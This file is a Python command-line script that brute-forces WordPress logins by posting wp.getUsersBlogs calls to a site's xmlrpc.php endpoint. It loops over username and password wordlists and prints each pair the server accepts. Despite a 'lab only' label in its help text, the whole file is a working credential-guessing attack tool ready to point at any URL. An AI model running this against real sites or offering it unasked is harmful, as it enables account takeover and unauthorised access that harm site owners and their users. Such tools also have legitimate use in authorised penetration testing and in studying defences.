#!/usr/bin/env python3
import requests
import argparse

parser = argparse.ArgumentParser(description="XML-RPC brute force test (lab only)")
parser.add_argument("-u", "--url", required=True, help="Target WordPress xmlrpc.php URL")
parser.add_argument("-U", "--userlist", required=True, help="File containing usernames")
parser.add_argument("-P", "--passlist", required=True, help="File containing passwords")
args = parser.parse_args()

with open(args.userlist, "r") as f:
    users = [line.strip() for line in f if line.strip()]

with open(args.passlist, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

if args.url[-3:] != "php":
    if args.url[-1] != "/":
        args.url = args.url + "/"
    args.url = args.url + "xmlrpc.php"

for username in users:
    for password in passwords:
        xml = f"""
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{username}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>
        """
        try:
            response = requests.post(args.url, data=xml, timeout=10)
            if "faultString" not in response.text:
                print(f"[SUCCESS] Username: {username} Password: {password}")
                
                break
            else:
                print(f"[FAIL] {username}:{password}")
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] {username}:{password} - {e}")
